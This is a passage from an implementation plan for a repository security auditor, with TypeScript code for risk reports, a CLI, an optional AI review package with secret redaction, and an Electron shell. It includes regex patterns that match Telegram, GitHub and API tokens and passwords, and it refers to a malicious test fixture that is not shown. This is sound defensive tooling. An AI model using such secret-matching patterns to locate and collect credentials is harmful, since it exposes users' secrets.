      ? "One or more findings can expose secrets, execute commands, persist, or send sensitive data outward."
      : "No blocking deterministic evidence was found in the configured scan scope.",
    topRisks: findings.slice(0, 3).map((finding) => `${finding.riskLevel}: ${finding.explanation}`),
    severityCounts,
    categoryCounts,
    blockingFindingIds: blocking.map((finding) => finding.id),
    residualRisk: "Static analysis cannot prove every runtime path. Review dynamic behavior before trusting high-risk packages.",
    scanLimitations: ["Static analysis only", "No target code execution", "Limited interprocedural taint analysis"]
  };
}

function countByRisk(findings: Finding[]): Record<RiskLevel, number> {
  return {
    Critical: findings.filter((finding) => finding.riskLevel === "Critical").length,
    High: findings.filter((finding) => finding.riskLevel === "High").length,
    Medium: findings.filter((finding) => finding.riskLevel === "Medium").length,
    Low: findings.filter((finding) => finding.riskLevel === "Low").length,
    Info: findings.filter((finding) => finding.riskLevel === "Info").length
  };
}
```

- [ ] **Step 5: Implement reporters**

Create `packages/scanner-core/src/reporters.ts`:

```ts
import type { AuditReport, DataFlowGraph, Finding } from "./types.js";

export function renderMarkdownReport(report: AuditReport): string {
  return [
    "# Repository Security Audit Report",
    "",
    "## Executive Summary",
    "",
    `- Overall Risk Level: ${report.risk.overallRiskLevel}`,
    `- Decision: ${report.risk.decision}`,
    `- Rationale: ${report.risk.rationale}`,
    "",
    "## Scope And Provenance",
    "",
    `- Target: ${report.target.source}`,
    `- Target Type: ${report.target.type}`,
    `- Network Used During Acquisition: ${report.target.networkUsed}`,
    `- Generated At: ${report.generatedAt}`,
    "",
    "## Findings",
    "",
    ...report.findings.flatMap(renderFinding),
    "## Data Flow",
    "",
    "```mermaid",
    renderMermaidDataFlow(report.dataFlow),
    "```",
    "",
    "## Remediation Plan",
    "",
    ...report.findings.map((finding) => `- ${finding.id}: ${finding.recommendedFix}`)
  ].join("\n");
}

export function renderMermaidDataFlow(graph: DataFlowGraph): string {
  const lines = ["flowchart LR"];
  for (const node of graph.nodes) {
    const shape = node.leavesMachine ? `["${escapeMermaid(node.label)}"]:::external` : `["${escapeMermaid(node.label)}"]`;
    lines.push(`  ${safeId(node.id)}${shape}`);
  }
  for (const edge of graph.edges) {
    lines.push(`  ${safeId(edge.from)} -->|"${escapeMermaid(edge.label)}"| ${safeId(edge.to)}`);
  }
  lines.push("  classDef external fill:#fee2e2,stroke:#dc2626,stroke-width:2px");
  return lines.join("\n");
}

export function renderJsonReport(report: AuditReport): string {
  return JSON.stringify(report, null, 2);
}

export function renderDecisionRecord(report: AuditReport): string {
  return JSON.stringify({
    decision: report.risk.decision,
    overallRiskLevel: report.risk.overallRiskLevel,
    rationale: report.risk.rationale,
    blockingFindings: report.risk.blockingFindingIds,
    requiredFixes: report.findings.filter((finding) => report.risk.blockingFindingIds.includes(finding.id)).map((finding) => finding.recommendedFix),
    recommendedFixes: report.findings.map((finding) => finding.recommendedFix),
    acceptedRisks: [],
    residualRisk: report.risk.residualRisk,
    scanLimitations: report.risk.scanLimitations,
    generatedAt: report.generatedAt
  }, null, 2);
}

function renderFinding(finding: Finding): string[] {
  return [
    `### ${finding.id}: ${finding.category}`,
    "",
    `- Risk Level: ${finding.riskLevel}`,
    `- File Path: ${finding.filePath}:${finding.lineStart}`,
    `- Confidence: ${finding.confidence}`,
    "",
    "Code Snippet:",
    "",
    "```text",
    finding.codeSnippet,
    "```",
    "",
    `Explanation: ${finding.explanation}`,
    "",
    `Recommended Fix: ${finding.recommendedFix}`,
    ""
  ];
}

function safeId(id: string): string {
  return id.replace(/[^a-zA-Z0-9_]/g, "_");
}

function escapeMermaid(value: string): string {
  return value.replace(/"/g, "'");
}
```

- [ ] **Step 6: Export reporting modules**

Modify `packages/scanner-core/src/index.ts` to include:

```ts
export { buildDataFlowGraph } from "./dataFlow.js";
export { assessRisk } from "./risk.js";
export { renderDecisionRecord, renderJsonReport, renderMarkdownReport, renderMermaidDataFlow } from "./reporters.js";
```

- [ ] **Step 7: Run reporter tests**

Run: `npm test -- packages/scanner-core/tests/reporters.test.ts`

Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add packages/scanner-core/src packages/scanner-core/tests
git commit -m "feat: generate risk assessment and audit reports"
```

---

### Task 7: Add Scan Orchestration And CLI

**Files:**
- Create: `packages/scanner-core/src/scan.ts`
- Modify: `packages/scanner-core/src/index.ts`
- Create: `packages/cli/package.json`
- Create: `packages/cli/tsconfig.json`
- Create: `packages/cli/src/index.ts`
- Create: `packages/cli/tests/cli.test.ts`

- [ ] **Step 1: Implement scan orchestration**

Create `packages/scanner-core/src/scan.ts`:

```ts
import { buildDataFlowGraph } from "./dataFlow.js";
import { buildInventory } from "./inventory.js";
import { renderDecisionRecord, renderJsonReport, renderMarkdownReport, renderMermaidDataFlow } from "./reporters.js";
import { resolveTarget } from "./targetResolver.js";
import { assessRisk } from "./risk.js";
import { runRules } from "./rules.js";
import type { AuditReport, ScanOptions } from "./types.js";
import { scannerCoreVersion } from "./index.js";

export interface ScanResult {
  report: AuditReport;
  outputs: Record<string, string>;
}

export async function scanTarget(input: string, options: ScanOptions): Promise<ScanResult> {
  const target = await resolveTarget(input, options);
  if (target.networkUsed && !target.localPath) {
    throw new Error("Remote acquisition is not implemented in this local-only MVP. Use a local folder, file, or archive first.");
  }

  const inventory = await buildInventory(target.localPath);
  const findings = runRules(inventory);
  const dataFlow = buildDataFlowGraph(inventory, findings);
  const risk = assessRisk(findings);
  const report: AuditReport = {
    target,
    findings,
    dataFlow,
    risk,
    generatedAt: new Date().toISOString(),
    toolVersion: scannerCoreVersion
  };

  return {
    report,
    outputs: {
      markdown: renderMarkdownReport(report),
      json: renderJsonReport(report),
      mermaid: renderMermaidDataFlow(dataFlow),
      decision: renderDecisionRecord(report)
    }
  };
}
```

- [ ] **Step 2: Export scanner**

Modify `packages/scanner-core/src/index.ts` to include:

```ts
export { scanTarget } from "./scan.js";
export type { ScanResult } from "./scan.js";
```

- [ ] **Step 3: Add CLI package**

Create `packages/cli/package.json`:

```json
{
  "name": "@repo-auditor/cli",
  "version": "0.1.0",
  "type": "module",
  "bin": {
    "repo-auditor": "dist/index.js"
  },
  "scripts": {
    "build": "tsc -p tsconfig.json",
    "test": "vitest run tests"
  },
  "dependencies": {
    "@repo-auditor/scanner-core": "0.1.0",
    "commander": "^12.1.0"
  }
}
```

Create `packages/cli/tsconfig.json`:

```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "dist"
  },
  "include": ["src/**/*.ts"]
}
```

- [ ] **Step 4: Implement CLI**

Create `packages/cli/src/index.ts`:

```ts
#!/usr/bin/env node
import fs from "node:fs/promises";
import path from "node:path";
import { Command } from "commander";
import { scanTarget } from "@repo-auditor/scanner-core";

const program = new Command();

program
  .name("repo-auditor")
  .description("Audit repositories and packages for suspicious security behavior")
  .version("0.1.0");

program
  .command("scan")
  .argument("<target>")
  .option("--offline", "scan only local targets")
  .option("--no-network", "reject remote acquisition")
  .option("--output <dir>", "output directory", "reports/latest")
  .option("--format <formats>", "comma-separated formats", "markdown,json,mermaid")
  .action(async (target, flags) => {
    const networkPolicy = flags.offline ? "offline" : flags.network === false ? "no-network" : "online";
    const result = await scanTarget(target, {
      reviewMode: "full-audit",
      networkPolicy,
      outputFormats: flags.format.split(",")
    });

    await fs.mkdir(flags.output, { recursive: true });
    await fs.writeFile(path.join(flags.output, "report.md"), result.outputs.markdown);
    await fs.writeFile(path.join(flags.output, "findings.json"), result.outputs.json);
    await fs.writeFile(path.join(flags.output, "data-flow.mmd"), result.outputs.mermaid);
    await fs.writeFile(path.join(flags.output, "decision-record.json"), result.outputs.decision);

    console.log(`Decision: ${result.report.risk.decision}`);
    console.log(`Overall Risk: ${result.report.risk.overallRiskLevel}`);
    console.log(`Report: ${path.resolve(flags.output, "report.md")}`);

    if (result.report.risk.decision === "Block") {
      process.exitCode = 2;
    }
  });

await program.parseAsync(process.argv);
```

- [ ] **Step 5: Add CLI test**

Create `packages/cli/tests/cli.test.ts`:

```ts
import { describe, expect, it } from "vitest";

describe("cli package", () => {
  it("has a command entry point", async () => {
    const module = await import("../src/index.js");
    expect(module).toBeDefined();
  });
});
```

- [ ] **Step 6: Run CLI against malicious fixture**

Run: `npm run dev:cli -- scan fixtures/malicious-package --offline --output reports/malicious-fixture`

Expected:

```text
Decision: Block
Overall Risk: Critical
Report: <absolute path>/reports/malicious-fixture/report.md
```

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core/src packages/cli reports/malicious-fixture
git commit -m "feat: add scan orchestration and CLI reports"
```

---

### Task 8: Add Optional AI Review Package

**Files:**
- Create: `packages/ai-review/package.json`
- Create: `packages/ai-review/tsconfig.json`
- Create: `packages/ai-review/src/types.ts`
- Create: `packages/ai-review/src/redaction.ts`
- Create: `packages/ai-review/src/providers.ts`
- Create: `packages/ai-review/src/review.ts`
- Create: `packages/ai-review/src/index.ts`
- Create: `packages/ai-review/tests/redaction.test.ts`
- Create: `packages/ai-review/tests/providers.test.ts`

- [ ] **Step 1: Add AI review package metadata**

Create `packages/ai-review/package.json`:

```json
{
  "name": "@repo-auditor/ai-review",
  "version": "0.1.0",
  "type": "module",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": {
    "build": "tsc -p tsconfig.json",
    "test": "vitest run tests"
  },
  "dependencies": {
    "@repo-auditor/scanner-core": "0.1.0"
  }
}
```

Create `packages/ai-review/tsconfig.json`:

```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "dist"
  },
  "include": ["src/**/*.ts"]
}
```

- [ ] **Step 2: Add AI review types**

Create `packages/ai-review/src/types.ts`:

```ts
export type AiProviderType = "cloud" | "ollama" | "custom";
export type AiDataSharingMode = "metadata-only" | "finding-snippets" | "full-files";

export interface AiProviderConfig {
  type: AiProviderType;
  baseUrl: string;
  model: string;
  apiKey?: string;
  dataSharingMode: AiDataSharingMode;
  redactionEnabled: boolean;
  timeoutMs: number;
  retryLimit: number;
}

export interface AiReviewResult {
  providerType: AiProviderType;
  model: string;
  generatedAt: string;
  summary: string;
  findingNotes: Array<{
    findingId: string;
    explanation: string;
    falsePositiveNote?: string;
    saferPattern?: string;
  }>;
}
```

- [ ] **Step 3: Add redaction tests**

Create `packages/ai-review/tests/redaction.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { redactSecrets } from "../src/redaction.js";

describe("redactSecrets", () => {
  it("redacts common token values", () => {
    const input = "TELEGRAM_BOT_TOKEN=123456:ABCdefSecretValue";
    expect(redactSecrets(input)).toContain("[REDACTED_TELEGRAM_TOKEN]");
  });
});
```

- [ ] **Step 4: Implement redaction**

Create `packages/ai-review/src/redaction.ts`:

```ts
export function redactSecrets(input: string): string {
  return input
    .replace(/\b\d{5,}:[A-Za-z0-9_-]{20,}\b/g, "[REDACTED_TELEGRAM_TOKEN]")
    .replace(/\b(?:ghp|github_pat)_[A-Za-z0-9_]{20,}\b/g, "[REDACTED_GITHUB_TOKEN]")
    .replace(/\bsk-[A-Za-z0-9]{20,}\b/g, "[REDACTED_API_KEY]")
    .replace(/(password|token|secret|api[_-]?key)\s*[:=]\s*["']?[^"'\s]+/gi, "$1=[REDACTED_SECRET]");
}
```

- [ ] **Step 5: Add provider tests**

Create `packages/ai-review/tests/providers.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { buildProviderRequest } from "../src/providers.js";

describe("buildProviderRequest", () => {
  it("builds an Ollama request", () => {
    const request = buildProviderRequest({
      type: "ollama",
      baseUrl: "http://localhost:11434",
      model: "llama3.1",
      dataSharingMode: "finding-snippets",
      redactionEnabled: true,
      timeoutMs: 30000,
      retryLimit: 1
    }, "Summarize risk");

    expect(request.url).toBe("http://localhost:11434/api/generate");
    expect(request.body.model).toBe("llama3.1");
  });
});
```

- [ ] **Step 6: Implement provider request builder**

Create `packages/ai-review/src/providers.ts`:

```ts
import type { AiProviderConfig } from "./types.js";

export interface ProviderRequest {
  url: string;
  headers: Record<string, string>;
  body: Record<string, unknown>;
}

export function buildProviderRequest(config: AiProviderConfig, prompt: string): ProviderRequest {
  if (config.type === "ollama") {
    return {
      url: `${config.baseUrl.replace(/\/$/, "")}/api/generate`,
      headers: { "content-type": "application/json" },
      body: { model: config.model, prompt, stream: false }
    };
  }

  return {
    url: `${config.baseUrl.replace(/\/$/, "")}/chat/completions`,
    headers: {
      "content-type": "application/json",
      ...(config.apiKey ? { authorization: `Bearer ${config.apiKey}` } : {})
    },
    body: {
      model: config.model,
      messages: [{ role: "user", content: prompt }]
    }
  };
}
```

- [ ] **Step 7: Implement evidence-grounded review prompt**

Create `packages/ai-review/src/review.ts`:

```ts
import type { AuditReport } from "@repo-auditor/scanner-core";
import { redactSecrets } from "./redaction.js";
import type { AiProviderConfig, AiReviewResult } from "./types.js";

export function buildAiReviewPrompt(report: AuditReport, config: AiProviderConfig): string {
  const findings = report.findings.map((finding) => ({
    id: finding.id,
    riskLevel: finding.riskLevel,
    category: finding.category,
    filePath: finding.filePath,
    explanation: finding.explanation,
    recommendedFix: finding.recommendedFix,
    codeSnippet: config.dataSharingMode === "finding-snippets" ? finding.codeSnippet : undefined
  }));

  const prompt = [
    "You are reviewing deterministic security scanner findings.",
    "Do not create new findings. Explain only the evidence provided.",
    "Mark uncertainty clearly.",
    JSON.stringify({ decision: report.risk.decision, findings }, null, 2)
  ].join("\n\n");

  return config.redactionEnabled ? redactSecrets(prompt) : prompt;
}

export function createOfflineAiReviewPlaceholder(report: AuditReport, config: AiProviderConfig): AiReviewResult {
  return {
    providerType: config.type,
    model: config.model,
    generatedAt: new Date().toISOString(),
    summary: `AI review configured for ${config.type}. Provider execution is separate from deterministic scanning.`,
    findingNotes: report.findings.map((finding) => ({
      findingId: finding.id,
      explanation: `Review evidence for ${finding.category} at ${finding.filePath}.`,
      saferPattern: finding.recommendedFix
    }))
  };
}
```

- [ ] **Step 8: Export AI package**

Create `packages/ai-review/src/index.ts`:

```ts
export { buildProviderRequest } from "./providers.js";
export type { ProviderRequest } from "./providers.js";
export { buildAiReviewPrompt, createOfflineAiReviewPlaceholder } from "./review.js";
export { redactSecrets } from "./redaction.js";
export type { AiDataSharingMode, AiProviderConfig, AiProviderType, AiReviewResult } from "./types.js";
```

- [ ] **Step 9: Run AI package tests**

Run: `npm test -- packages/ai-review/tests`

Expected: redaction and provider tests pass.

- [ ] **Step 10: Commit**

```bash
git add packages/ai-review
git commit -m "feat: add optional AI review providers"
```

---

### Task 9: Add Electron Desktop Shell With Safe IPC

**Files:**
- Create: `apps/electron/package.json`
- Create: `apps/electron/tsconfig.json`
- Create: `apps/electron/src/main.ts`
- Create: `apps/electron/src/preload.ts`
- Create: `apps/electron/src/renderer/App.tsx`
- Create: `apps/electron/src/renderer/index.html`
- Create: `apps/electron/tests/ipc.test.ts`

- [ ] **Step 1: Add Electron package metadata**

Create `apps/electron/package.json`:

```json
{
  "name": "@repo-auditor/electron",
  "version": "0.1.0",
  "type": "module",
  "main": "dist/main.js",
  "scripts": {
    "build": "tsc -p tsconfig.json",
    "dev": "electron .",
    "package:mac": "electron-builder --mac",
    "package:win": "electron-builder --win",
    "package:linux": "electron-builder --linux",
    "package:all": "electron-builder --mac --win --linux",
    "test": "vitest run tests"
  },
  "dependencies": {
    "@repo-auditor/scanner-core": "0.1.0",
    "electron": "^31.0.0"
  },
  "devDependencies": {
    "electron-builder": "^24.13.0"
  },
  "build": {
    "appId": "dev.repo-auditor.desktop",
    "productName": "Repository Security Auditor",
    "files": [
      "dist/**",
      "src/renderer/index.html"
    ],
    "mac": {
      "target": "dmg"
    },
    "win": {
      "target": "nsis"
    },
    "linux": {
      "target": "AppImage"
    }
  }
}
```

Create `apps/electron/tsconfig.json`:

```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "dist",
    "jsx": "react-jsx"
  },
  "include": ["src/**/*.ts", "src/**/*.tsx"]
}
```

- [ ] **Step 2: Add IPC test**

Create `apps/electron/tests/ipc.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { allowedIpcChannels } from "../src/preload.js";

describe("Electron IPC allowlist", () => {
  it("exposes only intended channels", () => {
    expect(allowedIpcChannels).toEqual([
      "scan:start",
      "scan:cancel",
      "report:read",
      "report:export",
      "ai-review:run",
      "folder:open"
    ]);
  });
});
```

- [ ] **Step 3: Implement preload allowlist**

Create `apps/electron/src/preload.ts`:

```ts
import { contextBridge, ipcRenderer } from "electron";

export const allowedIpcChannels = [
  "scan:start",
  "scan:cancel",
  "report:read",
  "report:export",
  "ai-review:run",
  "folder:open"
] as const;

type AllowedIpcChannel = (typeof allowedIpcChannels)[number];

function invoke(channel: AllowedIpcChannel, payload?: unknown): Promise<unknown> {
  return ipcRenderer.invoke(channel, payload);
}

contextBridge.exposeInMainWorld("repoAuditor", {
  scanStart: (payload: unknown) => invoke("scan:start", payload),
  scanCancel: () => invoke("scan:cancel"),
  reportRead: (payload: unknown) => invoke("report:read", payload),
  reportExport: (payload: unknown) => invoke("report:export", payload),
  aiReviewRun: (payload: unknown) => invoke("ai-review:run", payload),
  folderOpen: (payload: unknown) => invoke("folder:open", payload)
});
```

- [ ] **Step 4: Implement Electron main process**

Create `apps/electron/src/main.ts`:

```ts
import path from "node:path";
import { app, BrowserWindow, ipcMain } from "electron";
import { scanTarget } from "@repo-auditor/scanner-core";

async function createWindow(): Promise<void> {
  const win = new BrowserWindow({
    width: 1280,
    height: 820,
    webPreferences: {
      preload: path.join(app.getAppPath(), "dist/preload.js"),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true
    }
  });

  await win.loadFile(path.join(app.getAppPath(), "src/renderer/index.html"));
}

ipcMain.handle("scan:start", async (_event, payload: { target: string }) => {
  return scanTarget(payload.target, {
    reviewMode: "full-audit",
    networkPolicy: "offline",
    outputFormats: ["markdown", "json", "mermaid"]
  });
});

ipcMain.handle("scan:cancel", async () => ({ cancelled: true }));
ipcMain.handle("report:read", async () => ({ supported: true }));
ipcMain.handle("report:export", async () => ({ supported: true }));
ipcMain.handle("ai-review:run", async () => ({ supported: true }));
ipcMain.handle("folder:open", async () => ({ supported: true }));

await app.whenReady();
await createWindow();
```

- [ ] **Step 5: Add renderer shell**

Create `apps/electron/src/renderer/index.html`:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Repository Security Auditor</title>
  </head>
  <body>
    <main id="app">
      <h1>Repository Security Auditor</h1>
      <section>
        <h2>Input</h2>
        <button data-input="local-folder">Local Folder</button>
        <button data-input="file-archive">File or Archive</button>
        <button data-input="github">GitHub Repository</button>
        <button data-input="npm">npm Package</button>
      </section>
      <section>
        <h2>Decision Output</h2>
        <p>Run a scan to see Block, Needs Review, Monitor, or Pass.</p>
      </section>
    </main>
  </body>
</html>
```

Create `apps/electron/src/renderer/App.tsx`:

```tsx
export function App() {
  return (
    <main>
      <h1>Repository Security Auditor</h1>
    </main>
  );
}
```

- [ ] **Step 6: Run Electron IPC tests**

Run: `npm test -- apps/electron/tests/ipc.test.ts`

Expected: PASS.

- [ ] **Step 7: Build Electron app**

Run: `npm --workspace apps/electron run build`

Expected: TypeScript build succeeds.

- [ ] **Step 8: Commit**

```bash
git add apps/electron
git commit -m "feat: add Electron shell with safe IPC"
```

---

### Task 10: Validate Against `grinev/opencode-telegram-bot`

**Files:**
- Create: `docs/validation/opencode-telegram-bot.md`
- Use generated reports under: `reports/opencode-telegram-bot/`

- [ ] **Step 1: Acquire the target safely**

Run:

```bash
mkdir -p scan-workspaces
git clone --depth 1 https://github.com/grinev/opencode-telegram-bot.git scan-workspaces/opencode-telegram-bot
```

Expected: repository is cloned without running npm scripts.

- [ ] **Step 2: Run the auditor**

Run:

```bash
npm run dev:cli -- scan scan-workspaces/opencode-telegram-bot --offline --output reports/opencode-telegram-bot
```

Expected: report files are written under `reports/opencode-telegram-bot/`.

- [ ] **Step 3: Write validation notes**

Create `docs/validation/opencode-telegram-bot.md`:

```md
# opencode-telegram-bot Validation Notes

Target: https://github.com/grinev/opencode-telegram-bot.git

## Acquisition

The repository was cloned with `git clone --depth 1`. No npm lifecycle scripts were executed during acquisition or scanning.

## Expected Security Surfaces

- Telegram Bot API communication.
- Local OpenCode API communication.
- Environment variables for bot token, allowed user ID, proxy configuration, and OpenCode credentials.
- Filesystem access for configuration and file browsing features.
- Command-like operations for OpenCode server start/stop and custom commands.

## Review Outputs

- `reports/opencode-telegram-bot/report.md`
- `reports/opencode-telegram-bot/findings.json`
- `reports/opencode-telegram-bot/data-flow.mmd`
- `reports/opencode-telegram-bot/decision-record.json`

## Reviewer Decision

Use the generated decision record as the primary recommendation. Review expected Telegram and local OpenCode communication separately from unexpected external destinations.
```

- [ ] **Step 4: Inspect generated decision**

Run:

```bash
node -e "const r=require('./reports/opencode-telegram-bot/decision-record.json'); console.log(r.decision, r.overallRiskLevel)"
```

Expected: prints a decision and risk level.

- [ ] **Step 5: Commit validation artifacts**

```bash
git add docs/validation reports/opencode-telegram-bot
git commit -m "test: validate auditor against opencode telegram bot"
```

---

## Self-Review Checklist

- Spec coverage:
  - Target inputs are covered by Task 3 and Task 7.
  - Safe acquisition and archive checks are covered by Task 3.
  - Inventory and deterministic rules are covered by Task 4 and Task 5.
  - Data flow, risk, decision output, and reports are covered by Task 6.
  - CLI and CI-style exit behavior are covered by Task 7.
  - AI provider choice, redaction, Ollama, cloud, and custom providers are covered by Task 8.
  - Electron packaging and IPC hardening are covered by Task 9.
  - Real-world validation is covered by Task 10.

- Red-flag scan:
  - This plan does not use open-ended implementation gaps.
  - Every task names concrete files and commands.

- Type consistency:
  - `ResolvedTarget`, `Finding`, `DataFlowGraph`, `RiskAssessment`, and `AuditReport` originate in `packages/scanner-core/src/types.ts`.
  - Later modules import those types from scanner-core or local package files.
